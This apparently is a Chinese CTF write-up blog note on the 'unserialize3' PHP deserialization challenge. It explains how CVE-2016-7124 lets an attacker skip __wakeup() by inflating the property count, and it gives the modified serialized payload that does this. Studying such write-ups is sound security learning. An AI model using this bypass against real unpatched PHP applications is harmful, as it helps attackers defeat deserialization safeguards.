[反序列化学习笔记（二）CTF经典考题由浅至深](https://blog.csdn.net/qq_35493457/article/details/119735063)

# unserialize3

知识点：反序列化漏洞，主要还是绕过思想，和绕过正则一样

```php
class xctf {
    public $flag = '111';   // 定义了一个类属性 flag，初始值为 '111'

    public function __wakeup() {
        exit('bad requests');  // 定义了 __wakeup() 方法，用于防止反序列化后对象恢复时执行。
    }
}
?code=
```

在 PHP 中，`__wakeup()` 是一个魔术方法，当一个对象被 **反序列化** 时，这个方法会被自动调用。该方法通常用于防止恶意反序列化带来的安全问题。在这个例子中，`__wakeup()` 方法直接使用了 `exit()` 函数来终止执行，并输出 `'bad requests'`，这是为了防止反序列化后继续执行代码。

在这里我们可以看到只有一个魔术方法，而\__wakeup()魔术方法是反序列化之前检查执行的函数，也就是说，不管传入什么，都会优先执行\__wakeup()方法，但这里针对\__wakeup()方法有一个CVE漏洞，CVE-2016-7124，在传入的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过。
如下:

```php
<?php
class xctf{ 
	public $flag = '111';
}
$a = new xctf();
echo serialize($a); # O:4:"xctf":1:{s:4:"flag";s:3:"111";}
?>
```

将`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`变成`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`表示有两个参数，就能避免`exit()`，然后得到flag。